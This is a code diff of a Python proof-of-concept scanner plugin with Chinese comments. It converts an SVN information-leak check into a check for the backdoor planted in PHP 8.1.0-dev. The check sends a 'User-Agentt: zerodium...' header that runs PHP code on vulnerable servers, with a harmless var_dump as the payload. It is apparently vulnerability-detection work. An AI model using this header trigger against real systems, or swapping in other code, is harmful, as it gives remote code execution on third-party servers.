@@ -7,25 +7,25 @@ urllib3.disable_warnings()
 _info = {
     "author" : "jijue",                      # POC作者
     "version" : "1",                    # POC版本，默认是1  
-    "CreateDate" : "2021-06-09",        # POC创建时间
-    "UpdateDate" : "2021-06-09",        # POC创建时间
+    "CreateDate" : "2021-06-07",        # POC创建时间
+    "UpdateDate" : "2021-06-07",        # POC创建时间
     "PocDesc" : """
     略  
     """,                                # POC描述，写更新描述，没有就不写
 
-    "name" : "svn信息泄露",                        # 漏洞名称
-    "AppName" : "通用",                     # 漏洞应用名称
-    "AppVersion" : "无",                  # 漏洞应用版本
-    "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
+    "name" : "php_v8开发版后门",                        # 漏洞名称
+    "AppName" : "php",                     # 漏洞应用名称
+    "AppVersion" : "PHP 8.1.0-dev 版本",                  # 漏洞应用版本
+    "VulnDate" : "2021-03-28",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
     "VulnDesc" : """
-    造成SVN源代码漏洞的主要原因是管理员操作不规范，一些网站管理员在发布代码时，不愿意使用“导出”功能，而是直接复制代码文件夹到WEB服务器上，这就使得.svn隐藏文件夹被暴露于外网环境，黑客对此可进一步利用
+    PHP 8.1.0-dev 版本于 2021 年 3 月 28 日被植入后门，但后门很快被发现并移除。当服务器上存在此后门时，攻击者可以通过发送User-Agentt标头来执行任意代码。
     """,                                # 漏洞简要描述
 
     "fofa-dork":"无",                     # fofa搜索语句
-    "example" : "https://47.95.217.102:443",                     # 存在漏洞的演示url，写一个就可以了
+    "example" : "",                     # 存在漏洞的演示url，写一个就可以了
     "exp_img" : "",                      # 先不管  
 
-    "timeout" : 8,                      # 超时设定
+    "timeout" : 5,                      # 超时设定
 }
 
 def verify(host,proxy):
@@ -37,8 +37,7 @@ def verify(host,proxy):
     不存在漏洞：vuln = [False,""]
     """
     vuln = [False,""]
-    url = url_handle(host) + "/.svn/entries" # url自己按需调整
-    url1 = url_handle(host) + "/cdn/test1?ids1=127&ids2=0&ids3=0&id4=1"
+    url = url_handle(host) + "/" # url自己按需调整
 
     if proxy:
         proxies = {
@@ -46,6 +45,7 @@ def verify(host,proxy):
         "https": "http://%s"%(proxy),
         }
     headers = {"User-Agent":get_random_ua(),
+                "User-Agentt":"zerodiumvar_dump(133*133);",
                 "Connection":"close",
                 # "Content-Type": "application/x-www-form-urlencoded",
                 }
@@ -55,9 +55,7 @@ def verify(host,proxy):
         检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
         """
         req = requests.get(url,headers = headers , timeout = _info["timeout"],verify = False)
-        req1 = requests.get(url1,headers = headers , timeout = _info["timeout"],verify = False)
-        # print req1.text
-        if req.status_code == 200 and len(str(int(req.text.strip()))) == len(req.text.strip()) and req1.text != req.text:
+        if req.status_code == 200 and "int(17689)" in req.text:
             vuln = [True,req.text]
         else:
             vuln = [False,req.text]
